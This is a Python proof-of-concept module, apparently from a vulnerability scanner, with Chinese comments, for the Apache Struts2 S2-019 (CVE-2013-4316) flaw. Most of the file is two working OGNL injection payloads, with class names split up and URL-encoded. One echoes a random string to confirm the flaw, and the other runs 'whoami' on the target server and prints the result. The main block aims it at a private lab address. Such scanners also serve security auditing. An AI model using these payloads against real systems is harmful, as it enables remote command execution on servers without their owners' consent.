#!/usr/bin/env python3

'''
name: Struts2 S2-019漏洞，又名CVE-2013-4316漏洞
description: Struts2 S2-019漏洞可执行任意命令
'''

import re
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_019_BaseVerify:
    def __init__(self, url):
        self.url = url 
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Connection': "keep-alive",
                   "Content-Type": "application/x-www-form-urlencoded"
                  }
        self.check_payload = '''?debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22echo%20''' + self.capta + '''%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()'''
        self.cmd_payload = '''?debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22whoami%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close()'''

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            if self.capta in check_req.text:
                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                print('存在S2-019漏洞,执行whoami命令成功，结果为：', cmd_req.text)
                return True
            else:
                print('不存在S2-019漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_019 = S2_019_BaseVerify('http://192.168.30.242:8888/S2-019/example/HelloWorld.action')
    S2_019.run()
